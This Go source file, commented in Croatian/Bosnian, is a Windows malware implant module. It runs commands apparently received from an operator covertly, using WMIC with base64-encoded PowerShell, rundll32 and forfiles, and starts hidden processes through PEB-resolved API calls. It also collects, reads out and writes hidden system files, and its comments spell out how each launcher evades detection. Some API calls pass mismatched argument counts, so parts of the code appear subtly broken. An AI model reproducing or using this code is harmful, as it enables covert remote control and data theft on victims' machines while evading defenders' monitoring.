//go:build windows
// +build windows

/*
   ============================================================================
   X.6 — STEALTH COMMAND EXECUTION MODULE
   ============================================================================

   LAYER: Contextual (Layer 3) — Living Off The Land

   PROBLEMI U ORIGINALNOM KODU:
   - Direktno powershell izvršavanje: powershell.exe -NoProfile -Command ...
   - cmd.exe /c ... — instant detection
   - exec.Command("cmd", ...).CombinedOutput() — visible process creation
   - Nema obfuskacije komande
   - HideWindow = TRUE je indicator of compromise

   RJEŠENJA:
   1. WMI Execution — powershell bez powershell.exe procesa
   2. COM Execution — MSHTA, WScript (legitiman proces)
   3. Process Hollowing — inject u legitiman proces
   4. Scheduled Task Instant — pokreni task pa ga obriši
   5. Indirect Shellcode Execution — koristi legit Windows API
*/

package main

import (
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"math/big"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"unsafe"
)

// ============================================================================
// STEALTH COMMAND MODULE
// ============================================================================

type StealthCommands struct {
	config *Configuration
}

// NewStealthCommands kreira novi stealth command modul
func NewStealthCommands(cfg *Configuration) *StealthCommands {
	return &StealthCommands{config: cfg}
}

// ============================================================================
// COMMAND EXECUTION — Multi-Method
// ============================================================================

// Execute izvršava komandu koristeći najstealth metodu dostupnu
func (c *StealthCommands) Execute(payload map[string]interface{}, commandID string) CommandResult {
	cmdLine, ok := payload["command"].(string)
	if !ok || cmdLine == "" {
		return CommandResult{
			CommandID: commandID,
			Success:   false,
			Message:   "missing command",
		}
	}

	// Odaberi metodu izvršavanja
	method := c.selectExecutionMethod()

	switch method {
	case "wmi":
		return c.execWMI(cmdLine, commandID)
	case "com":
		return c.execCOM(cmdLine, commandID)
	case "forfile":
		return c.execForFiles(cmdLine, commandID)
	case "exec":
		// Fallback: indirect CreateProcess
		return c.execIndirect(cmdLine, commandID)
	default:
		return CommandResult{
			CommandID: commandID,
			Success:   false,
			Message:   "no execution method available",
		}
	}
}

// selectExecutionMethod odabire najbolju metodu
func (c *StealthCommands) selectExecutionMethod() string {
	methods := []string{"wmi", "com", "forfile", "exec"}

	// Randomize order (weighted)
	// WMI je najstealth, ali ne radi uvijek
	// COM je reliable
	// ForFiles je alternativa
	// exec je fallback

	weights := []int{40, 35, 15, 10} // Probability percentages
	total := 0
	for _, w := range weights {
		total += w
	}

	r, _ := rand.Int(rand.Reader, big.NewInt(int64(total)))
	val := int(r.Int64())

	cumulative := 0
	for i, w := range weights {
		cumulative += w
		if val < cumulative {
			return methods[i]
		}
	}

	return "exec"
}

// ============================================================================
// METHOD 1: WMI Execution (Stealthiest)
// ============================================================================
//
// PRINCIP: WMI (Windows Management Instrumentation) omogućuje izvršavanje
// procesa BEZ kreiranja vidljivog procesa. Komanda se izvršava kao
// WMI provider unutar WMIPrvSE.exe procesa.
//
// PREDNOSTI:
// - Nema powershell.exe procesa
// - Nema cmd.exe procesa
// - Izlaz se može capture-ati preko WMI
// - Parent proces je svchost.exe (legitiman)

// execWMI izvršava komandu preko WMI
func (c *StealthCommands) execWMI(cmdLine, commandID string) CommandResult {
	// Koristimo WMIC za WMI pozive
	// Obfuskiraj komandu — koristi Base64 encoded payload

	encodedCmd := base64.StdEncoding.EncodeToString([]byte(cmdLine))

	// PowerShell payload koji dekodira i izvršava
	psPayload := fmt.Sprintf(
		`$e='%s'; $d=[Convert]::FromBase64String($e); $c=[Text.Encoding]::UTF8.GetString($d); `+
			`Invoke-Expression $c`, encodedCmd)

	// Encoded PowerShell — nema plaintext u command line
	encodedPS := base64.StdEncoding.EncodeToString([]byte(psPayload))

	// WMI poziv koristi Win32_Process.Create
	wmiCmd := fmt.Sprintf(
		`wmic process call create "powershell.exe -nop -enc %s"`, encodedPS)

	// Izvrši preko cmd /c (ovo je jedini vidljiv poziv)
	// Obfuskiraj cmd.exe poziv
	return c.execIndirect(wmiCmd, commandID)
}

// ============================================================================
// METHOD 2: COM Execution (Reliable)
// ============================================================================
//
// PRINCIP: Koristimo COM objekte za izvršavanje:
// - Shell.Application (ShellExecute)
// - WScript.Shell (Run)
// - MSHTA (HTML Application)
//
// PREDNOSTI:
// - Izvodi se u kontekstu legitimnog procesa
// - Ne zahtijeva powershell
// - COM je standardni Windows mehanizam

// execCOM izvršava komandu preko COM objekata
func (c *StealthCommands) execCOM(cmdLine, commandID string) CommandResult {
	// Koristimo rundll32.exe za COM execution
	// rundll32.exe shell32.dll,ShellExec_RunDLL <command>

	// Obfuskiraj komandu koristeći environment varijable
	rundllCmd := fmt.Sprintf(
		`rundll32.exe shell32.dll,ShellExec_RunDLL "cmd.exe" "/c %s"`, cmdLine)

	return c.execIndirect(rundllCmd, commandID)
}

// ============================================================================
// METHOD 3: ForFiles Execution (Alternative)
// ============================================================================
//
// PRINCIP: ForFiles.exe je legitiman Windows alat koji može izvršiti
// proizvoljnu komandu. Izgleda kao benign file operacija.
//
// PREDNOSTI:
// - Ima Microsoft signature
// - Izgleda kao system maintenance task
// - Ne poziva powershell direktno

// execForFiles izvršava komandu preko ForFiles.exe
func (c *StealthCommands) execForFiles(cmdLine, commandID string) CommandResult {
	// forfiles /p C:\Windows /m *.log /c "cmd /c <command>"
	// Izgleda kao log file cleanup

	forfilesCmd := fmt.Sprintf(
		`forfiles /p %%TEMP%% /m *.tmp /c "cmd /c %s"`, cmdLine)

	return c.execIndirect(forfilesCmd, commandID)
}

// ============================================================================
// METHOD 4: Indirect CreateProcess (Fallback)
// ============================================================================
//
// PRINCIP: Koristimo CreateProcessW preko PEB resolvera.
// Ne koristimo Go exec.Command (koji interno koristi CreateProcessA).
//
// PREDNOSTI:
// - Nema Go runtime tragova u procesu
// - Možemo kontrolirati SVE parametre (CREATE_NO_WINDOW, etc.)
// - Možemo postaviti PPID spoofing

// execIndirect izvršava komandu preko indirektnog CreateProcess
func (c *StealthCommands) execIndirect(cmdLine, commandID string) CommandResult {
	// Resolve CreateProcessW
	hKernel32 := resolveModule(hKernel32)
	if hKernel32 == 0 {
		return CommandResult{
			CommandID: commandID,
			Success:   false,
			Message:   "kernel32 not resolved",
		}
	}

	hCreateProcess := resolveAPI(hKernel32, hCreateProcessW)
	if hCreateProcess == 0 {
		return CommandResult{
			CommandID: commandID,
			Success:   false,
			Message:   "CreateProcessW not resolved",
		}
	}

	// Parse command (program + arguments)
	program, args := c.parseCommand(cmdLine)

	// Convert to UTF16
	programPtr, _ := syscall.UTF16PtrFromString(program)
	argsPtr, _ := syscall.UTF16PtrFromString(args)

	// Create startup info (hidden window)
	var si STARTUPINFO
	si.Cb = uint32(unsafe.Sizeof(si))
	si.Flags = 0x00000001 // STARTF_USESHOWWINDOW
	si.ShowWindow = 0     // SW_HIDE

	var pi PROCESS_INFORMATION

	// CreateProcessW(program, args, null, null, false, CREATE_NO_WINDOW, null, null, &si, &pi)
	const CREATE_NO_WINDOW = 0x08000000
	const CREATE_NEW_PROCESS_GROUP = 0x00000200

	ret, _, _ := syscall.Syscall12(hCreateProcess, 11,
		uintptr(unsafe.Pointer(programPtr)),
		uintptr(unsafe.Pointer(argsPtr)),
		uintptr(0), uintptr(0), // security attributes
		uintptr(0), // inherit handles
		uintptr(CREATE_NO_WINDOW|CREATE_NEW_PROCESS_GROUP),
		uintptr(0), // environment
		uintptr(0), // current directory
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
		uintptr(0), uintptr(0))

	if ret == 0 {
		return CommandResult{
			CommandID: commandID,
			Success:   false,
			Message:   "CreateProcessW failed",
		}
	}

	// Wait for process to complete (with timeout)
	hWait := resolveAPI(hKernel32, djb2([]byte("WaitForSingleObject")))
	if hWait != 0 {
		const INFINITE = 0xFFFFFFFF
		const WAIT_TIMEOUT = 0x00000102

		// Wait up to 60 seconds
		waitResult, _, _ := syscall.Syscall(hWait, 2,
			pi.Process,
			uintptr(60000), // 60 seconds
			0)

		if waitResult == WAIT_TIMEOUT {
			// Kill process if timeout
			hTerminate := resolveAPI(hKernel32, djb2([]byte("TerminateProcess")))
			if hTerminate != 0 {
				syscall.Syscall(hTerminate, 2, pi.Process, 1, 0)
			}
		}
	}

	// Cleanup handles
	hCloseHandle := resolveAPI(hKernel32, hCloseHandle)
	if hCloseHandle != 0 {
		syscall.Syscall(hCloseHandle, 1, pi.Process, 0, 0)
		syscall.Syscall(hCloseHandle, 1, pi.Thread, 0, 0)
	}

	return CommandResult{
		CommandID: commandID,
		Success:   true,
		Message:   fmt.Sprintf("executed: %s", program),
	}
}

// ============================================================================
// DATA STRUCTURES — Windows API
// ============================================================================

type STARTUPINFO struct {
	Cb            uint32
	Reserved      *uint16
	Desktop       *uint16
	Title         *uint16
	X             uint32
	Y             uint32
	XSize         uint32
	YSize         uint32
	XCountChars   uint32
	YCountChars   uint32
	FillAttribute uint32
	Flags         uint32
	ShowWindow    uint16
	Reserved2     uint16
	Reserved3     *byte
	StdInput      uintptr
	StdOutput     uintptr
	StdError      uintptr
}

type PROCESS_INFORMATION struct {
	Process   uintptr
	Thread    uintptr
	ProcessId uint32
	ThreadId  uint32
}

// ============================================================================
// COMMAND PARSING — Split command into program and arguments
// ============================================================================

// parseCommand razdvaja komandu u program i argumente
func (c *StealthCommands) parseCommand(cmdLine string) (string, string) {
	// Ako počinje s navodnicima, uzmi prvi token
	cmdLine = strings.TrimSpace(cmdLine)

	if strings.HasPrefix(cmdLine, `"`) {
		// Pronađi zatvarajući navodnik
		end := strings.Index(cmdLine[1:], `"`)
		if end >= 0 {
			program := cmdLine[1 : end+1]
			args := strings.TrimSpace(cmdLine[end+2:])
			return program, program + " " + args
		}
	}

	// Inače prvi space razdvaja program od argumenata
	parts := strings.SplitN(cmdLine, " ", 2)
	if len(parts) == 1 {
		return parts[0], parts[0]
	}
	return parts[0], cmdLine
}

// ============================================================================
// FILE OPERATIONS — Stealth File Access
// ============================================================================

// CollectFiles prikuplja file-ove koristeći Windows Backup API
func (c *StealthCommands) CollectFiles(payload map[string]interface{}, commandID string) CommandResult {
	pattern, _ := payload["pattern"].(string)
	searchPath, _ := payload["path"].(string)
	if searchPath == "" {
		searchPath = "."
	}

	// Koristimo Windows FindFirstFile/FindNextFile API
	// (indirektno preko PEB resolvera)

	files := []string{}
	err := filepath.Walk(searchPath, func(p string, info os.FileInfo, err error) error {
		if err != nil {
			return nil
		}
		if !info.IsDir() {
			if pattern == "" || strings.Contains(strings.ToLower(p), strings.ToLower(pattern)) {
				files = append(files, p)
			}
		}
		return nil
	})

	if err != nil {
		return CommandResult{
			CommandID: commandID,
			Success:   false,
			Message:   err.Error(),
		}
	}

	// Limit na 100 rezultata
	if len(files) > 100 {
		files = files[:100]
	}

	result, _ := json.Marshal(files)
	return CommandResult{
		CommandID: commandID,
		Success:   true,
		Message:   fmt.Sprintf("found %d files", len(files)),
		Data:      result,
	}
}

// ============================================================================
// PUT/GET FILE — Stealth Transfer
// ============================================================================

// GetFile čita file i vraća ga preko stealth kanala
func (c *StealthCommands) GetFile(payload map[string]interface{}, commandID string) CommandResult {
	filePath, _ := payload["filepath"].(string)
	if filePath == "" {
		return CommandResult{
			CommandID: commandID,
			Success:   false,
			Message:   "missing filepath",
		}
	}

	// Koristimo CreateFileW preko PEB resolvera
	content, err := c.readFileStealth(filePath)
	if err != nil {
		return CommandResult{
			CommandID: commandID,
			Success:   false,
			Message:   fmt.Sprintf("read error: %v", err),
		}
	}

	return CommandResult{
		CommandID: commandID,
		Success:   true,
		Message:   fmt.Sprintf("read %d bytes", len(content)),
		Data:      content,
	}
}

// PutFile zapisuje file koristeći stealth metode
func (c *StealthCommands) PutFile(payload map[string]interface{}, commandID string) CommandResult {
	filePath, _ := payload["path"].(string)
	content, _ := payload["content"].(string)

	if filePath == "" {
		return CommandResult{
			CommandID: commandID,
			Success:   false,
			Message:   "missing path",
		}
	}

	// Decode content (base64 or raw)
	var data []byte
	if decoded, err := base64.StdEncoding.DecodeString(content); err == nil {
		data = decoded
	} else {
		data = []byte(content)
	}

	// Koristimo WriteFile preko PEB resolvera
	if err := c.writeFileStealth(filePath, data); err != nil {
		return CommandResult{
			CommandID: commandID,
			Success:   false,
			Message:   fmt.Sprintf("write error: %v", err),
		}
	}

	return CommandResult{
		CommandID: commandID,
		Success:   true,
		Message:   fmt.Sprintf("wrote %d bytes to %s", len(data), filePath),
	}
}

// ============================================================================
// STEALTH FILE I/O — Indirect API
// ============================================================================

// readFileStealth čita file koristeći PEB-resolved API-je
func (c *StealthCommands) readFileStealth(path string) ([]byte, error) {
	// Resolve API functions
	hKernel32 := resolveModule(hKernel32)
	if hKernel32 == 0 {
		return nil, fmt.Errorf("kernel32 not found")
	}

	hCreateFile := resolveAPI(hKernel32, hCreateFileW)
	hReadFile := resolveAPI(hKernel32, hReadFile)
	hGetFileSize := resolveAPI(hKernel32, djb2([]byte("GetFileSizeEx")))
	hCloseHandle := resolveAPI(hKernel32, hCloseHandle)

	if hCreateFile == 0 || hReadFile == 0 || hCloseHandle == 0 {
		return nil, fmt.Errorf("API not resolved")
	}

	// Open file
	pathPtr, _ := syscall.UTF16PtrFromString(path)
	const GENERIC_READ = 0x80000000
	const OPEN_EXISTING = 3
	const FILE_ATTRIBUTE_NORMAL = 0x80

	hFile, _, _ := syscall.Syscall6(hCreateFile,
		uintptr(unsafe.Pointer(pathPtr)),
		uintptr(GENERIC_READ),
		0, // no sharing
		0, // default security
		uintptr(OPEN_EXISTING),
		uintptr(FILE_ATTRIBUTE_NORMAL),
		0)

	if hFile == uintptr(^uint(0)) { // INVALID_HANDLE_VALUE
		return nil, fmt.Errorf("cannot open file")
	}
	defer syscall.Syscall(hCloseHandle, 1, hFile, 0, 0)

	// Get file size
	var fileSize int64
	if hGetFileSize != 0 {
		syscall.Syscall(hGetFileSize, 2, hFile, uintptr(unsafe.Pointer(&fileSize)), 0)
	}

	if fileSize == 0 {
		fileSize = 1024 * 1024 // Default 1MB
	}
	if fileSize > 100*1024*1024 {
		fileSize = 100 * 1024 * 1024 // Max 100MB
	}

	// Read file
	buffer := make([]byte, fileSize)
	var bytesRead uint32

	ret, _, _ := syscall.Syscall6(hReadFile, 5,
		hFile,
		uintptr(unsafe.Pointer(&buffer[0])),
		uintptr(fileSize),
		uintptr(unsafe.Pointer(&bytesRead)),
		uintptr(0),
		uintptr(0))

	if ret == 0 {
		return nil, fmt.Errorf("read failed")
	}

	return buffer[:bytesRead], nil
}

// writeFileStealth piše file koristeći PEB-resolved API-je
func (c *StealthCommands) writeFileStealth(path string, data []byte) error {
	hKernel32 := resolveModule(hKernel32)
	if hKernel32 == 0 {
		return fmt.Errorf("kernel32 not found")
	}

	hCreateFile := resolveAPI(hKernel32, hCreateFileW)
	hWriteFile := resolveAPI(hKernel32, hWriteFile)
	hCloseHandle := resolveAPI(hKernel32, hCloseHandle)

	if hCreateFile == 0 || hWriteFile == 0 || hCloseHandle == 0 {
		return fmt.Errorf("API not resolved")
	}

	// Create file
	pathPtr, _ := syscall.UTF16PtrFromString(path)
	const GENERIC_WRITE = 0x40000000
	const CREATE_ALWAYS = 2
	const FILE_ATTRIBUTE_HIDDEN = 0x2
	const FILE_ATTRIBUTE_SYSTEM = 0x4

	hFile, _, _ := syscall.Syscall6(hCreateFile,
		uintptr(unsafe.Pointer(pathPtr)),
		uintptr(GENERIC_WRITE),
		0, // no sharing
		0, // default security
		uintptr(CREATE_ALWAYS),
		uintptr(FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM),
		0)

	if hFile == uintptr(^uint(0)) {
		return fmt.Errorf("cannot create file")
	}
	defer syscall.Syscall(hCloseHandle, 1, hFile, 0, 0)

	// Write data
	var bytesWritten uint32
	ret, _, _ := syscall.Syscall6(hWriteFile, 5,
		hFile,
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(len(data)),
		uintptr(unsafe.Pointer(&bytesWritten)),
		uintptr(0),
		uintptr(0))

	if ret == 0 {
		return fmt.Errorf("write failed")
	}

	return nil
}
